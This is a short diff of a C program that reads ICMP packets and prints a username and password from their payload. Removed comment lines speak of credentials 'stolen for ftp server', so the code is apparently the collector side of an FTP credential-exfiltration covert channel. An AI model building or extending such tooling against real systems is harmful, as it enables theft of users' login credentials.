@@ -103,16 +103,10 @@ int main(int argc, char *argv[])
 
     iphead = (struct ip *)recvbuff;
     icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
-    // memcpy(&serv_addr, ((char *)icmphead + 8),
-    // 	   sizeof (struct in_addr));
-
-    // fprintf(stdout, "Stolen for ftp server %s:\n", inet_ntoa(serv_addr));
     fprintf(stdout, "Username:    %s\n",
             (char *)((char *)icmphead + 8));
     fprintf(stdout, "Password:    %s\n",
             (char *)((char *)icmphead + 8+strlen((char *)((char *)icmphead + 8))+1));
-    // fprintf(stdout, "Password:    %s\n",
-	//      (char *)((char *)icmphead + 28));
     
     close(icmp_sock);
     
